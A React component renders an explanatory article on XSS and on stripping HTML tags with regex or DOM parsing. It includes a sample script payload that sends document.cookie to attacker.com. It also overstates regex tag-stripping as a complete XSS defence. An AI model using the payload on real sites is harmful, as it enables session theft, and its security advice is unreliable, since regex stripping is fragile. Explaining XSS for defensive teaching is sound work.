import React, { useState } from 'react';

const HTMLTextStripperArticle: React.FC = () => {
    const [isExpanded, setIsExpanded] = useState(false);

    return (
        <div className="bg-zinc-800/50 p-6 rounded-lg">
            <div className={`relative transition-all duration-500 ease-in-out ${isExpanded ? 'max-h-[9999px]' : 'max-h-60 overflow-hidden'}`}>
                <article className="prose prose-invert max-w-none prose-p:text-gray-300 prose-headings:text-teal-400">
                    <h2>The Dangers of Unsanitized HTML, Why Stripping Tags is Essential for Security (XSS), and Using Regular Expressions vs. the DOM for Text Cleaning</h2>
                    <p>
                        In web development, accepting user-generated content is a double-edged sword. While it enables rich user interaction, it also opens the door to significant security vulnerabilities if not handled properly. One of the most common threats is Cross-Site Scripting (XSS), an attack where malicious scripts are injected into otherwise benign and trusted websites. A fundamental defense against XSS is sanitization, and often the simplest and most effective form of sanitization is to strip all HTML tags, leaving only the plain text content behind.
                    </p>

                    <h3>Why Unsanitized HTML is a Major Security Risk</h3>
                    <p>
                        When a web application displays user-submitted content without validating or sanitizing it, an attacker can input HTML that includes a malicious <code>&lt;script&gt;</code> tag. When another user's browser renders this content, it will execute the script. This script can then perform actions on behalf of the user, such as stealing session cookies, redirecting the user to a malicious site, or defacing the webpage.
                    </p>
                    <p>
                        For example, a comment form that directly saves and displays user input could be vulnerable. An attacker could submit a comment like: <code>&lt;script&gt;document.location='http://attacker.com/steal-cookie?c=' + document.cookie&lt;/script&gt;</code>. Any user who views this comment would unknowingly send their session cookie to the attacker. Stripping all HTML tags neutralizes this threat completely by removing the executable vector.
                    </p>

                    <h3>Regex vs. DOM: Two Approaches to Stripping HTML</h3>
                    <p>
                        There are two primary client-side methods for removing HTML tags from a string in JavaScript, each with its own trade-offs.
                    </p>
                    <ol className="list-decimal list-inside">
                        <li>
                            <strong>Regular Expressions (Regex):</strong> This is often the fastest and most direct method. A simple regular expression like <code>/&lt;[^&gt;]*&gt;/g</code> can find all occurrences of characters between angle brackets and replace them with an empty string. This approach is highly performant and doesn't require interacting with the browser's rendering engine. It's excellent for its simplicity and speed, making it ideal for a real-time tool where instant feedback is required.
                        </li>
                        <li>
                            <strong>DOM Parsing:</strong> This method involves programmatically creating a temporary, off-screen DOM element (like a <code>&lt;div&gt;</code>), setting its <code>innerHTML</code> to the HTML string, and then reading its <code>textContent</code> or <code>innerText</code> property. The browser's own HTML parser does the work of interpreting the tags, and the <code>textContent</code> property returns only the text nodes. For example:
                            <pre><code>{`function stripWithDOM(html) {\n  const doc = new DOMParser().parseFromString(html, 'text/html');\n  return doc.body.textContent || "";\n}`}</code></pre>
                            This method can be more robust at interpreting malformed HTML than a simple regex, but it is generally slower and can have security implications if not used carefully (though modern browser implementations are much safer).
                        </li>
                    </ol>
                    <p>For a tool designed for speed and simplicity, the regex approach is often preferred as it provides excellent performance for the specific task of removing all tags without exception.</p>
                </article>
                {!isExpanded && (
                    <div className="absolute bottom-0 left-0 right-0 h-24 bg-gradient-to-t from-gray-800/50 to-transparent"></div>
                )}
            </div>
            <button 
                onClick={() => setIsExpanded(!isExpanded)} 
                className="text-teal-400 hover:text-cyan-300 font-semibold mt-4"
            >
                {isExpanded ? 'Show Less' : 'Read More...'}
            </button>
        </div>
    );
};

export default HTMLTextStripperArticle;